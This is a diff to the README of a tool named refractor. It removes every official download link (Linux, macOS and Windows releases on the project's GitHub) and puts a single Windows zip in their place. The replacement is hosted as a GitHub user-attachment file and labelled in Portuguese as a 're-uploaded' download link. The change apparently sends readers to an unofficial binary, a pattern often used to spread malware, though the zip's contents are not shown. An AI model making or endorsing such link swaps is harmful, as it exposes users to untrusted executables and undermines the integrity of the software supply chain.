@@ -18,13 +18,9 @@ You will get a list that you can paste into the search box on [*Watchtower ONLIN
 
 ## Downloads
 
-- [Linux (x86_64)](https://github.com/erykjj/refractor/releases/latest/download/refractor_linux_x86_64.tgz)
-- [Linux (ARM64)](https://github.com/erykjj/refractor/releases/latest/download/refractor_linux_arm64.tgz)
+Link para baixar reupado
+[refractor_windows_amd64.zip](https://github.com/user-attachments/files/24212819/refractor_windows_amd64.zip)
 
-- [macOS (universal)](https://github.com/erykjj/refractor/releases/latest/download/refractor_macos.tar.gz)
-
-- [Windows (amd64)](https://github.com/erykjj/refractor/releases/latest/download/refractor_windows_amd64.zip)
-- [Windows (ARM64)](https://github.com/erykjj/refractor/releases/latest/download/refractor_windows_arm64.zip)
 
 ## Usage
 
@@ -46,9 +42,6 @@ You will get a list that you can paste into the search box on [*Watchtower ONLIN
 ```
 
 ## Examples
-
-Link para baixar reupado
-[refractor_windows_amd64.zip](https://github.com/user-attachments/files/24212819/refractor_windows_amd64.zip)
 
 
 Linux/macOS: `./refractor -c:es bosquejo.docx`
